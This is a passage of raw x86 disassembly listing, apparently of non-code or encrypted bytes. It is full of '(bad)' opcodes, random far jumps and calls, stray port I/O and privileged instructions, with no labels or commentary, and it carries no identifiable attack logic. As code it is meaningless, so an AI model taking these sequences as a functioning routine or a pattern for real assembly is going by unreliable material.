  41c0a7:	xor    al,0xa4
  41c0a9:	jns    0x41c079
  41c0ab:	or     al,0x25
  41c0ad:	add    DWORD PTR [edx+0x68f523f1],0xffffffb2
  41c0b4:	jae    0x41c101
  41c0b6:	sbb    edx,eax
  41c0b8:	outs   dx,BYTE PTR ss:[esi]
  41c0ba:	sahf   
  41c0bb:	js     0x41c0e0
  41c0bd:	jo     0x41c077
  41c0bf:	cmp    al,0x80
  41c0c1:	retf   
  41c0c2:	adc    esp,ebp
  41c0c4:	mov    DWORD PTR [edx-0x77],0x9944054b
  41c0cb:	sbb    al,0x2
  41c0cd:	pop    ebp
  41c0ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0cf:	dec    eax
  41c0d0:	hlt    
  41c0d1:	jecxz  0x41c079
  41c0d3:	jmp    0x9e82356
  41c0d8:	and    eax,0x467b64d2
  41c0dd:	mov    ecx,0xd253fe16
  41c0e2:	fsubr  QWORD PTR [edx+ebp*4+0x7e]
  41c0e6:	out    dx,al
  41c0e7:	jmp    0x58670d6e
  41c0ec:	push   0xf1e2a2af
  41c0f1:	adc    ch,BYTE PTR [ecx]
  41c0f3:	cld    
  41c0f4:	out    dx,eax
  41c0f5:	inc    esp
  41c0f6:	(bad)  
  41c0f8:	or     dh,BYTE PTR fs:[eax+0x45]
  41c0fc:	cmp    al,0x96
  41c0fe:	div    BYTE PTR [ebp+0x7ef17c0b]
  41c104:	dec    esp
  41c105:	sbb    bh,BYTE PTR [ecx]
  41c107:	pop    es
  41c108:	mov    edx,0xcd79ac42
  41c10d:	mov    BYTE PTR [edi+0x1a],ah
  41c110:	sbb    BYTE PTR [edi],ch
  41c112:	mov    ch,0x28
  41c114:	ds sub eax,0x11aa22ab
  41c11a:	in     eax,dx
  41c11b:	shl    BYTE PTR [ecx-0x76d80208],0x50
  41c122:	in     al,0xc
  41c124:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c125:	ins    DWORD PTR es:[edi],dx
  41c126:	cdq    
  41c127:	out    0x82,al
  41c129:	xor    BYTE PTR [edi+0x3697128],dl
  41c12f:	in     al,0x33
  41c131:	pop    ebx
  41c132:	dec    esi
  41c133:	inc    ebx
  41c134:	(bad)  
  41c135:	addr16 mov ch,0xec
  41c138:	in     al,dx
  41c139:	jbe    0x41c0f7
  41c13b:	test   al,0x38
  41c13d:	push   0xffffffce
  41c13f:	out    0xb4,al
  41c141:	and    BYTE PTR [ebx-0x1e7d46e],bl
  41c147:	in     eax,dx
  41c148:	xor    ebx,ecx
  41c14a:	leave  
  41c14b:	jg     0x41c162
  41c14d:	cmp    BYTE PTR [ebx],0x5a
  41c150:	ret    
  41c151:	cmp    al,0x9a
  41c153:	inc    esp
  41c154:	sahf   
  41c155:	popa   
  41c156:	test   BYTE PTR [eax+0x13],0xbb
  41c15a:	pop    edi
  41c15b:	hlt    
  41c15c:	into   
  41c15d:	pop    ds
  41c15e:	pop    edx
  41c15f:	ficomp WORD PTR [edi-0x7e]
  41c162:	(bad)  
  41c165:	mov    edx,DWORD PTR [esp+ebp*8-0x71]
  41c169:	mov    esi,0xd44e9c1f
  41c16e:	adc    esp,DWORD PTR [ecx+0x1e]
  41c171:	push   ds
  41c172:	inc    ecx
  41c173:	pushf  
  41c174:	and    cl,ah
  41c176:	test   esi,0x4a4afb11
  41c17c:	test   BYTE PTR [ebx-0x47],ah
  41c17f:	sub    eax,DWORD PTR [edi-0x52]
  41c182:	scas   al,BYTE PTR es:[edi]
  41c183:	inc    ebp
  41c184:	mov    ebx,0x3c12f6c1
  41c189:	ds xor eax,0xac5518cf
  41c18f:	mov    edx,DWORD PTR [ebp+0x24]
  41c192:	ja     0x41c1a3
  41c194:	repz and DWORD PTR [esi+0x3e],ecx
  41c198:	add    eax,0x83e90cc8
  41c19d:	(bad)  
  41c19f:	gs sbb ah,0xc5
  41c1a3:	das    
  41c1a4:	jge    0x41c21d
  41c1a6:	cmp    dl,ch
  41c1a8:	pop    ds
  41c1a9:	imul   edi,DWORD PTR [ecx],0x1
  41c1ac:	push   esi
  41c1ad:	cli    
  41c1ae:	repz sub al,0x70
  41c1b1:	jge    0x41c1b6
  41c1b3:	sub    ecx,esi
  41c1b5:	dec    bp
  41c1b7:	bound  esp,QWORD PTR [esi]
  41c1b9:	add    edi,ebp
  41c1bb:	or     dl,al
  41c1bd:	aaa    
  41c1be:	mov    WORD PTR [esi],cs
  41c1c0:	xor    al,BYTE PTR [esi-0x8e0ad]
  41c1c6:	push   edx
  41c1c7:	and    DWORD PTR [ebx],edi
  41c1c9:	jmp    0x7d6aea52
  41c1ce:	xor    BYTE PTR [ebx+0x1b],al
  41c1d1:	ror    ecx,1
  41c1d3:	shl    BYTE PTR [ebx-0x273ce951],cl
  41c1d9:	inc    ebx
  41c1da:	mov    BYTE PTR [esi],cl
  41c1dc:	inc    ecx
  41c1dd:	and    BYTE PTR [ecx-0x1d0c6a38],al
  41c1e3:	adc    bl,bh
  41c1e5:	cld    
  41c1e6:	neg    DWORD PTR [eax+0x48]
  41c1e9:	dec    ebp
  41c1ea:	nop
  41c1eb:	sub    eax,0x8d44e27
  41c1f0:	int    0x7
  41c1f2:	add    eax,0xa90a9ccc
  41c1f7:	xor    BYTE PTR [esi+0x2e],dh
  41c1fa:	or     BYTE PTR [edi-0x6ec8886e],ah
  41c200:	inc    ebp
  41c201:	mov    ch,0x62
  41c203:	push   0x42
  41c205:	mov    esi,esi
  41c207:	xlat   BYTE PTR ds:[ebx]
  41c208:	scas   al,BYTE PTR es:[edi]
  41c209:	cmp    ecx,DWORD PTR [ebx]
  41c20b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c20d:	es std 
  41c20f:	sub    ebx,DWORD PTR [ebx+ebx*4+0x69]
  41c213:	pop    edx
  41c214:	outs   dx,DWORD PTR ds:[esi]
  41c215:	dec    ebx
  41c216:	ret    0x7388
  41c219:	sub    bl,BYTE PTR [eax]
  41c21b:	int    0x31
  41c21d:	mov    edi,0x126dd3f4
  41c222:	mov    ax,0xce93
  41c226:	inc    esp
  41c227:	mov    al,bl
  41c229:	ins    BYTE PTR es:[edi],dx
  41c22a:	pop    ss
  41c22b:	and    al,0x42
  41c22d:	ror    esi,1
  41c22f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c230:	pop    edi
  41c231:	sub    ch,BYTE PTR [ecx+0x41]
  41c234:	fild   QWORD PTR [eax]
  41c236:	mov    edi,ss
  41c238:	and    DWORD PTR [edi],edx
  41c23a:	pop    ebx
  41c23b:	(bad)  
  41c23c:	mov    ebp,0xee2dd9ea
  41c241:	xchg   ebp,eax
  41c242:	pop    esi
  41c243:	jl     0x41c2c1
  41c245:	das    
  41c246:	fwait
  41c247:	mov    ebx,0x7f8d37d7
  41c24c:	xor    al,0xed
  41c24e:	inc    edx
  41c24f:	adc    al,0xcd
  41c251:	std    
  41c252:	inc    edx
  41c253:	pop    ebp
  41c254:	or     BYTE PTR [edx],dh
  41c256:	pop    esp
  41c257:	or     ebp,edi
  41c259:	sbb    ebx,ebx
  41c25b:	in     eax,dx
  41c25c:	add    al,0xee
  41c25e:	repz inc esp
  41c260:	cmp    al,0xc2
  41c262:	mov    bl,BYTE PTR [ecx+ecx*2]
  41c265:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c266:	jno    0x41c28b
  41c268:	jmp    0x41c2b3
  41c26a:	xchg   ebp,eax
  41c26b:	retf   0x1ef1
  41c26e:	jg     0x41c2dc
  41c270:	sub    BYTE PTR [ebp+0x53],dl
  41c273:	imul   ebx,DWORD PTR [edi],0xffffffec
  41c276:	into   
  41c277:	jp     0x41c26f
  41c279:	jb     0x41c247
  41c27b:	adc    BYTE PTR [esi-0x65fec457],al
  41c281:	inc    edx
  41c282:	cdq    
  41c283:	dec    edx
  41c284:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c285:	mov    DWORD PTR [edi],ebp
  41c287:	int3   
  41c288:	jbe    0x41c26e
  41c28a:	mov    ebp,0x856faee9
  41c28f:	mov    edi,0x775d142d
  41c294:	call   0x3752:0x2efef8d9
  41c29b:	std    
  41c29c:	jne    0x41c264
  41c29e:	inc    ebp
  41c29f:	lock aam 0x81
  41c2a2:	fimul  WORD PTR [edx-0x5c00f04a]
  41c2a8:	mov    dl,0x85
  41c2aa:	adc    DWORD PTR [edi-0x2ba3fc95],edi
  41c2b0:	enter  0x244e,0xd3
  41c2b4:	(bad)  
  41c2b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2b7:	enter  0x186c,0x46
  41c2bb:	fmul   QWORD PTR [esi]
  41c2bd:	add    esi,edx
  41c2bf:	mov    al,ds:0xb620e89f
  41c2c4:	popf   
  41c2c5:	adc    dl,BYTE PTR [esi-0x93eaa86]
  41c2cb:	aaa    
  41c2cc:	je     0x41c253
  41c2ce:	jg     0x41c34f
  41c2d0:	jp     0x41c2b0
  41c2d2:	in     al,dx
  41c2d3:	int3   
  41c2d4:	(bad)  
  41c2d5:	rcl    DWORD PTR [edx+eiz*1],cl
  41c2d8:	xchg   ebp,eax
  41c2d9:	pusha  
  41c2da:	and    al,0x76
  41c2dc:	xchg   BYTE PTR [ecx+0x20],bl
  41c2df:	cwde   
  41c2e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2e1:	and    al,0x17
  41c2e3:	into   
  41c2e4:	or     eax,0x4bda16a5
  41c2e9:	mov    eax,DWORD PTR [ebx+0x5ad19c81]
  41c2ef:	lds    ecx,FWORD PTR [esi+0x42]
  41c2f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2f3:	stos   DWORD PTR es:[edi],eax
  41c2f4:	test   BYTE PTR [ebx-0x322e9003],dh
  41c2fa:	push   ds
  41c2fb:	pushf  
  41c2fc:	nop
  41c2fd:	mov    ecx,0x1790dc28
  41c302:	add    ebx,esp
  41c304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c305:	or     bh,BYTE PTR [edi]
  41c307:	sub    ax,WORD PTR [ecx]
  41c30a:	shl    DWORD PTR [edx-0x677d910d],0x1a
  41c311:	(bad)  
  41c312:	pop    ss
  41c313:	jp     0x41c2f6
  41c315:	sti    
  41c316:	rcl    DWORD PTR [edi-0x12],cl
  41c319:	xchg   edi,eax
  41c31a:	jmp    FWORD PTR [ecx-0x15]
  41c31d:	cs retf 
  41c31f:	jnp    0x41c345
  41c321:	and    DWORD PTR [edi],edi
  41c323:	push   eax
  41c324:	jle    0x41c2ac
  41c326:	add    al,0x5f
  41c328:	mov    edx,0x182fb9b6
  41c32d:	push   esi
  41c32e:	cs mov ch,0x39
  41c331:	lods   eax,DWORD PTR ds:[esi]
  41c332:	nop
  41c333:	jg     0x41c347
  41c335:	xor    DWORD PTR [edi+0x5a],0x330bc295
  41c33c:	ret    0xc020
  41c33f:	pop    edi
  41c340:	aas    
  41c341:	outs   dx,BYTE PTR ds:[esi]
  41c342:	call   0xb426:0x78cbb3ac
  41c349:	cld    
  41c34a:	pushf  
  41c34b:	pop    edx
  41c34c:	lods   eax,DWORD PTR ds:[esi]
  41c34d:	shl    BYTE PTR [ebx+0x3b],cl
  41c350:	sbb    BYTE PTR [edi-0x1a],bl
  41c353:	jp     0x41c31b
  41c355:	mov    dl,al
  41c357:	xchg   ebx,eax
  41c358:	jno    0x41c3cb
  41c35a:	xchg   esp,eax
  41c35b:	mov    bh,0x81
  41c35d:	and    edi,DWORD PTR [edi-0x3cc3ee2c]
  41c363:	adc    al,BYTE PTR ss:[ecx+0x2dd665a]
  41c36a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c36b:	xor    dl,BYTE PTR [ecx+0x2909bc9f]
  41c371:	loopne 0x41c3ab
  41c373:	or     BYTE PTR [eax+0x7a143b18],cl
  41c379:	inc    ecx
  41c37a:	mov    ds:0x88c84163,al
  41c37f:	scas   al,BYTE PTR es:[edi]
  41c380:	es pop eax
  41c382:	inc    DWORD PTR [edi+0x4e]
  41c385:	stos   BYTE PTR es:[edi],al
  41c386:	sub    eax,0x486dc34f
  41c38b:	jae    0x41c353
  41c38d:	rcr    DWORD PTR [edi+0x41],1
  41c390:	and    dh,0x1d
  41c393:	xchg   ebp,eax
  41c394:	push   ss
  41c395:	(bad)  
  41c397:	lods   al,BYTE PTR ds:[esi]
  41c398:	fimul  DWORD PTR [edi]
  41c39a:	lods   al,BYTE PTR ds:[esi]
  41c39b:	sti    
  41c39c:	cmp    bx,WORD PTR [eax+edx*8-0x5e]
  41c3a1:	iret   
  41c3a2:	nop
  41c3a3:	xchg   esi,eax
  41c3a4:	test   al,ah
  41c3a6:	rcr    DWORD PTR [esi-0x5f1c2f22],0x64
  41c3ad:	in     al,dx
  41c3ae:	adc    bh,BYTE PTR [ebx]
  41c3b0:	jb     0x41c353
  41c3b2:	sub    esp,ebp
  41c3b4:	cdq    
  41c3b5:	mov    edi,0x61282503
  41c3ba:	jl     0x41c424
  41c3bc:	adc    BYTE PTR [edx-0x36],cl
  41c3bf:	nop
  41c3c0:	out    0xd9,eax
  41c3c2:	or     al,0x22
  41c3c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3c5:	jno    0x41c3f7
  41c3c7:	stos   BYTE PTR es:[edi],al
  41c3c8:	leave  
  41c3c9:	inc    ecx
  41c3ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3cb:	std    
  41c3cc:	es cwde 
  41c3ce:	add    BYTE PTR [ebx-0x9457bf2],ch
  41c3d4:	ins    DWORD PTR es:[edi],dx
  41c3d5:	dec    eax
  41c3d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3d7:	add    al,0x9d
  41c3d9:	fs jge 0x41c3e8
  41c3dc:	mov    al,ds:0x1ad7b389
  41c3e1:	pop    edi
  41c3e2:	aaa    
  41c3e3:	es jns 0x41c3c2
  41c3e6:	stos   DWORD PTR es:[edi],eax
  41c3e7:	xor    esp,DWORD PTR [ebx]
  41c3e9:	and    esi,DWORD PTR [ecx-0xba9c97d]
  41c3ef:	push   0xb7452194
  41c3f4:	xchg   esp,eax
  41c3f5:	sbb    al,0xff
  41c3f7:	jae    0x41c3d6
  41c3f9:	mov    es,WORD PTR [ebx-0x1b0f33f7]
  41c3ff:	fisttp WORD PTR [esi-0x5e]
  41c402:	aad    0xb
  41c404:	(bad)  [ebx+ecx*4-0x17483cfa]
  41c40b:	jns    0x41c3ae
  41c40d:	jle    0x41c3d9
  41c40f:	mov    ecx,0x880bba27
  41c414:	jo     0x41c43a
  41c416:	iret   
  41c417:	lds    esi,FWORD PTR [ebp-0x66036fa9]
  41c41d:	push   ss
  41c41e:	cmp    DWORD PTR [ecx-0x36a6bfaa],0xffffffa3
  41c425:	inc    ecx
  41c426:	jg     0x41c3e6
  41c428:	sub    BYTE PTR [ebp-0x25],0x5e
  41c42c:	test   al,0x3
  41c42e:	sti    
  41c42f:	out    0x19,eax
  41c431:	xchg   edi,eax
  41c432:	xchg   ebp,eax
  41c433:	loop   0x41c436
  41c435:	es jl  0x41c3f4
  41c438:	pusha  
  41c439:	mov    eax,ds:0xb5eb7710
  41c43e:	mov    al,0x6c
  41c440:	add    ebp,edi
  41c442:	pop    edx
  41c443:	push   eax
  41c444:	jmp    0x41c4c4
  41c446:	mov    es,WORD PTR [ecx+0x59345483]
  41c44c:	imul   edx,DWORD PTR [eax-0x7c],0xffffffa9
  41c450:	enter  0x77c3,0xb6
  41c454:	stos   DWORD PTR es:[edi],eax
  41c455:	(bad)  
  41c456:	cmp    DWORD PTR [eax+edi*4+0x1],edi
  41c45a:	push   ebp
  41c45b:	xor    eax,0x6bd8fcd1
  41c460:	shr    DWORD PTR [edi+ebp*8+0x6b],1
  41c464:	repnz sbb dl,BYTE PTR [edi]
  41c467:	or     edi,DWORD PTR [ecx+0x13]
  41c46a:	mov    ds:0x948e96af,al
  41c46f:	add    ecx,ebp
  41c471:	mov    WORD PTR [ebx+0xf],cs
  41c474:	mov    ah,0x91
  41c476:	push   0xcbde7b88
  41c47b:	bswap  ebp
  41c47d:	mov    ebp,0x76ed589a
  41c482:	imul   edi,DWORD PTR [edx],0x2c
  41c485:	iret   
  41c486:	sub    edi,edi
  41c488:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c489:	and    ebp,DWORD PTR [ebx+eiz*8]
  41c48c:	dec    esi
  41c48d:	fldenv [edi-0x33959b2b]
  41c493:	sub    BYTE PTR [esi-0x5295d37e],0x8f
  41c49a:	xor    ebx,DWORD PTR [ebx-0x12b46989]
  41c4a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4a1:	in     al,0x9
  41c4a3:	retf   
  41c4a4:	loopne 0x41c525
  41c4a6:	pop    ebx
  41c4a7:	mov    es,WORD PTR [edi-0x1ade6212]
  41c4ad:	jno    0x41c499
  41c4af:	loop   0x41c46e
  41c4b1:	or     eax,0x37deb6b8
  41c4b6:	and    DWORD PTR [esi-0x35],esi
  41c4b9:	sbb    DWORD PTR [edx+ebp*8+0x5bdee81c],esi
  41c4c0:	(bad)  
  41c4c1:	loope  0x41c4f0
  41c4c3:	std    
  41c4c4:	shr    DWORD PTR [edi+0x2d88681e],0x48
  41c4cb:	sbb    eax,0xc1a19c74
  41c4d0:	jmp    0x6dfc:0x48f3e495
  41c4d7:	push   ds
  41c4d8:	inc    edi
  41c4d9:	ret    
  41c4da:	and    BYTE PTR [esi-0xa57699],bl
  41c4e0:	add    eax,0x4d66f181
  41c4e5:	stos   BYTE PTR es:[edi],al
  41c4e6:	adc    BYTE PTR [edx+0xd],dh
  41c4e9:	cs ss sbb eax,0xce3cd8b4
  41c4f0:	or     BYTE PTR [edi+0x7e04cef9],bh
  41c4f6:	and    BYTE PTR [esi+edi*1],ah
  41c4f9:	cli    
  41c4fa:	mov    eax,0x72162715
  41c4ff:	lds    ecx,FWORD PTR [ebx+0x5de8cfe9]
  41c505:	xlat   BYTE PTR ds:[ebx]
  41c506:	inc    ecx
  41c507:	jbe    0x41c532
  41c509:	stos   DWORD PTR es:[edi],eax
  41c50a:	inc    eax
  41c50b:	mov    eax,ds:0x6b0ce4bd
  41c510:	test   eax,0x1c75ffd4
  41c515:	hlt    
  41c516:	ret    
  41c517:	out    0x5,al
  41c519:	add    eax,0x4bdb9a81
  41c51e:	mov    dl,0x8b
  41c520:	pop    ebp
  41c521:	push   edx
  41c522:	out    dx,eax
  41c523:	xchg   edi,eax
  41c524:	inc    esi
  41c525:	and    esp,DWORD PTR [esi-0xc45689c]
  41c52b:	mov    bh,0xee
  41c52d:	bound  edi,QWORD PTR [esi+0xa8e06de]
  41c533:	sub    BYTE PTR [ebx-0x51],cl
  41c536:	adc    ebp,DWORD PTR [edx+edi*8]
  41c539:	stos   BYTE PTR es:[edi],al
  41c53a:	js     0x41c4fe
  41c53c:	mov    edx,0xb53cd2df
  41c541:	or     esp,ebp
  41c543:	cld    
  41c544:	test   al,cl
  41c546:	in     al,dx
  41c547:	shr    DWORD PTR [ebp+0x18c5b225],0x45
  41c54e:	dec    ebx
  41c54f:	cmp    bh,BYTE PTR [esi+0x46]
  41c552:	dec    eax
  41c553:	add    cl,BYTE PTR [edi+0x598b83e0]
  41c559:	shr    DWORD PTR [ecx+0x37f78408],cl
  41c55f:	xor    eax,0x713caff3
  41c564:	ja     0x41c544
  41c566:	inc    edi
  41c567:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c568:	mov    bl,0x81
  41c56a:	clc    
  41c56b:	xchg   esp,eax
  41c56c:	les    ebp,FWORD PTR ds:[ebx-0x62]
  41c570:	pop    eax
  41c571:	lods   eax,DWORD PTR ds:[esi]
  41c572:	sub    ebp,ecx
  41c574:	fild   QWORD PTR [ebx+0x2e2996f0]
  41c57a:	sub    eax,0x966af80c
  41c57f:	leave  
  41c580:	pop    edi
  41c581:	sbb    eax,0x19c0e42b
  41c586:	sub    ebx,ecx
  41c588:	popf   
  41c589:	ror    DWORD PTR [eax+ecx*1-0xee3322d],0x4e
  41c591:	gs das 
  41c593:	cwde   
  41c594:	mov    dh,0x11
  41c596:	mov    esp,0x2ea5d5bb
  41c59b:	fdivr  st(4),st
  41c59d:	out    dx,al
  41c59e:	cmp    ebp,edx
  41c5a0:	les    ebp,FWORD PTR [esi+0x3dc6dd1d]
  41c5a6:	arpl   WORD PTR [eax],cx
  41c5a8:	xchg   ebx,eax
  41c5a9:	push   esi
  41c5aa:	call   0x3b94d4a3
  41c5af:	js     0x41c5a2
  41c5b1:	push   cs
  41c5b2:	jo     0x41c5d9
  41c5b4:	out    0xb7,eax
  41c5b6:	push   eax
  41c5b7:	lods   eax,DWORD PTR ds:[esi]
  41c5b8:	out    dx,al
  41c5b9:	idiv   BYTE PTR [ebp+ebx*4-0x22f3a9cc]
  41c5c0:	mov    al,ds:0x57d4aa7e
  41c5c5:	cs stos BYTE PTR es:[edi],al
  41c5c7:	jnp    0x41c587
  41c5c9:	and    bl,bh
  41c5cb:	ror    ecx,0x1c
  41c5ce:	into   
  41c5cf:	and    DWORD PTR [edi-0x4c],0x23
  41c5d3:	js     0x41c5b1
  41c5d5:	jnp    0x41c5ac
  41c5d7:	mov    eax,ds:0x48e5b507
  41c5dc:	sub    eax,0x6942df07
  41c5e1:	mov    BYTE PTR [eax+0x7],bl
  41c5e4:	loope  0x41c630
  41c5e6:	push   eax
  41c5e7:	gs jmp 0xf572:0x5fa092a3
  41c5ef:	and    ebp,DWORD PTR [edi]
  41c5f1:	push   eax
  41c5f2:	sbb    al,0xa1
  41c5f4:	cmp    al,0xdb
  41c5f6:	clc    
  41c5f7:	push   0xffffffdc
  41c5f9:	xor    ah,ch
  41c5fb:	enter  0xcd72,0xfe
  41c5ff:	fcomp  DWORD PTR [edx]
  41c601:	mov    ecx,0x4d21e96b
  41c606:	shr    BYTE PTR [edi],1
  41c608:	xor    edx,DWORD PTR [esi]
  41c60a:	imul   ecx,DWORD PTR [eax-0x5ecda66b],0xd948eb24
  41c614:	xchg   ecx,eax
  41c615:	xchg   esi,eax
  41c616:	or     al,0xb
  41c618:	(bad)  
  41c619:	sub    esi,DWORD PTR [esi+0x50]
  41c61c:	mov    dh,0xf2
  41c61e:	dec    ecx
  41c61f:	add    esi,ecx
  41c621:	sub    al,0x56
  41c623:	je     0x41c66e
  41c625:	add    eax,edi
  41c627:	ins    DWORD PTR es:[edi],dx
  41c628:	je     0x41c66d
  41c62a:	repz test al,0x0
  41c62d:	sub    BYTE PTR [ecx-0x6995a5cc],dh
  41c633:	daa    
  41c634:	jg     0x41c674
  41c636:	push   ebp
  41c637:	iret   
  41c638:	je     0x41c621
  41c63a:	fisub  WORD PTR [esi+0x4a2d0ee8]
  41c640:	jno    0x41c6a8
  41c642:	fnsave [esi-0x3159f34d]
  41c648:	ja     0x41c640
  41c64a:	sbb    eax,0x966a2fcd
  41c64f:	fistp  WORD PTR [eax-0x155e56d4]
  41c655:	rol    al,1
  41c657:	fcom   QWORD PTR [ebx]
  41c659:	inc    ecx
  41c65a:	xor    ah,BYTE PTR [edi]
  41c65c:	or     eax,0x4b1b9c72
  41c661:	test   BYTE PTR [ecx],al
  41c663:	out    dx,al
  41c664:	add    al,0x3a
  41c666:	bound  edx,QWORD PTR [edx]
  41c668:	xchg   bh,bh
  41c66a:	pop    ds
  41c66b:	cmp    eax,0xf5b16dbf
  41c670:	xor    BYTE PTR [edi-0x56d82f31],cl
  41c676:	(bad)  
  41c678:	rcl    DWORD PTR [ecx],cl
  41c67a:	jbe    0x41c6e5
  41c67c:	ins    DWORD PTR es:[edi],dx
  41c67d:	mov    cl,0x47
  41c67f:	or     al,0xb
  41c681:	jbe    0x41c6c8
  41c683:	mov    dl,0x87
  41c685:	xlat   BYTE PTR ds:[ebx]
  41c686:	aaa    
  41c687:	inc    ebx
  41c688:	imul   ebp,DWORD PTR ds:0xd304f93b,0x369b2850
  41c692:	shl    DWORD PTR [eax+ebp*4-0x6fc25f8a],cl
  41c699:	cmp    DWORD PTR [edi+0x7d24ecd5],eax
  41c69f:	jne    0x41c69c
  41c6a1:	sbb    ah,dh
  41c6a3:	shl    bh,cl
  41c6a5:	xchg   ebx,eax
  41c6a6:	rcr    DWORD PTR [esi+0x1f],cl
  41c6a9:	call   0xb948:0xef3bfaef
  41c6b0:	jae    0x41c69f
  41c6b2:	jo     0x41c72c
  41c6b4:	xlat   BYTE PTR ds:[ebx]
  41c6b5:	jnp    0x41c673
  41c6b7:	inc    esp
  41c6b8:	adc    ch,al
  41c6ba:	shl    BYTE PTR [eax-0x70],1
  41c6bd:	inc    edi
  41c6be:	add    BYTE PTR [ebx+eiz*2-0x47],ch
  41c6c2:	pop    esp
  41c6c3:	mov    eax,ds:0x53d97779
  41c6c8:	test   DWORD PTR [ebp+0x18],0x9a2b6e0b
  41c6cf:	xchg   edx,eax
  41c6d0:	int3   
  41c6d1:	pop    edx
  41c6d2:	das    
  41c6d3:	ror    ebp,0x13
  41c6d6:	and    ch,bl
  41c6d8:	and    esi,DWORD PTR [esi+esi*1-0x96c2f47]
  41c6df:	gs push esp
  41c6e1:	or     DWORD PTR [edi-0x4f44ecb0],esp
  41c6e7:	arpl   bx,cx
  41c6e9:	stos   DWORD PTR es:[edi],eax
  41c6ea:	lods   eax,DWORD PTR ds:[esi]
  41c6eb:	imul   ebp,DWORD PTR [esi],0x891ce49a
  41c6f1:	sub    dh,ah
  41c6f3:	xchg   BYTE PTR [ecx],ah
  41c6f5:	xchg   ebp,eax
  41c6f6:	xor    DWORD PTR [edx-0x77c59913],eax
  41c6fc:	adc    DWORD PTR [esi+0x41],esi
  41c6ff:	jge    0x41c72f
  41c701:	mov    cl,0x62
  41c703:	mov    ch,0xc2
  41c705:	fisttp WORD PTR [ebp-0x11494931]
  41c70b:	arpl   WORD PTR [eax-0x25af1b48],bx
  41c711:	cld    
  41c712:	add    DWORD PTR ds:0xdd9ca07d,edx
  41c718:	jge    0x41c72e
  41c71a:	mov    edi,0x7c6fc814
  41c71f:	cmp    DWORD PTR [esi-0x2d],0xd81196f2
  41c726:	add    esp,DWORD PTR [edi+0x20]
  41c729:	xlat   BYTE PTR ds:[ebx]
  41c72a:	sub    al,0xf6
  41c72c:	xrelease mov BYTE PTR [eax-0x2f],dh
  41c730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c731:	jle    0x41c6bd
  41c733:	pop    eax
  41c734:	mul    BYTE PTR [ebp-0x79]
  41c737:	mov    bl,dl
  41c739:	jmp    0x83f1139b
  41c73e:	inc    ebx
  41c73f:	jo     0x41c77d
  41c741:	rcr    BYTE PTR [eax+0x27df7e94],0xf7
  41c748:	or     ah,bl
  41c74a:	cmp    BYTE PTR [edx],al
  41c74c:	mov    ebp,0x7180e3a7
  41c751:	popa   
  41c752:	mov    BYTE PTR [ebx+0x25c6fe],dh
  41c758:	and    eax,0x68a4aecc
  41c75d:	(bad)  
  41c75f:	mov    ds:0x23db0c42,al
  41c764:	mov    cl,bl
  41c766:	arpl   WORD PTR [edi],bx
  41c768:	dec    ebx
  41c769:	call   eax
  41c76b:	mov    al,0xa0
  41c76d:	call   DWORD PTR [ebp+0x5e13ebf]
  41c773:	dec    eax
  41c774:	inc    edx
  41c775:	cli    
  41c776:	sub    BYTE PTR [edx+0x202c4d0f],cl
  41c77c:	sub    bl,BYTE PTR [ebx]
  41c77e:	inc    ecx
  41c77f:	xor    esi,edi
  41c781:	(bad)  
  41c782:	mov    ebp,0xc2998a93
  41c787:	in     al,dx
  41c788:	fadd   st(3),st
  41c78a:	inc    ebp
  41c78b:	pushf  
  41c78c:	jge    0x41c722
  41c78e:	stos   DWORD PTR es:[edi],eax
  41c78f:	jle    0x41c7f2
  41c791:	sub    ebp,DWORD PTR [ebx-0x61540050]
  41c797:	xor    edi,DWORD PTR [ecx+0x9]
  41c79a:	jmp    0x4b84:0x40b284e3
  41c7a1:	sub    DWORD PTR [eax-0x584ca12a],esp
  41c7a7:	xor    eax,0x8b6e94d6
  41c7ac:	es dec esi
  41c7ae:	in     al,0xc7
  41c7b0:	iret   
  41c7b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7b2:	mov    eax,ds:0x7aaeefca
  41c7b7:	inc    esi
  41c7b8:	mov    dh,0x47
  41c7ba:	cmp    esp,edi
  41c7bc:	aaa    
  41c7bd:	mov    dl,0xc5
  41c7bf:	push   ds
  41c7c0:	shl    BYTE PTR [edi-0x25d41d55],cl
  41c7c6:	xchg   edx,eax
  41c7c7:	cmp    bl,dl
  41c7c9:	mov    ch,0x9
  41c7cb:	mov    BYTE PTR [edi+0x21],bl
  41c7ce:	adc    DWORD PTR [ecx],eax
  41c7d0:	jbe    0x41c7cc
  41c7d2:	and    eax,0x5248951a
  41c7d7:	xor    BYTE PTR [edx+eiz*4+0x1c],cl
  41c7db:	sbb    DWORD PTR [edi],ecx
  41c7dd:	mov    eax,ds:0x4f46f7cf
  41c7e2:	ins    DWORD PTR es:[edi],dx
  41c7e3:	xchg   ecx,eax
  41c7e4:	dec    esp
  41c7e5:	pusha  
  41c7e6:	jae    0x41c7a0
  41c7e8:	push   cs
  41c7e9:	mov    ds:0x4c411506,al
  41c7ee:	leave  
  41c7ef:	adc    eax,0xb092b391
  41c7f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7f5:	push   ds
  41c7f6:	jb     0x41c794
  41c7f8:	xchg   ebx,eax
  41c7f9:	scas   eax,DWORD PTR es:[edi]
  41c7fa:	push   ss
  41c7fb:	popa   
  41c7fc:	les    ebp,FWORD PTR [ebx-0x3b4b28b2]
  41c802:	cld    
  41c803:	pop    esp
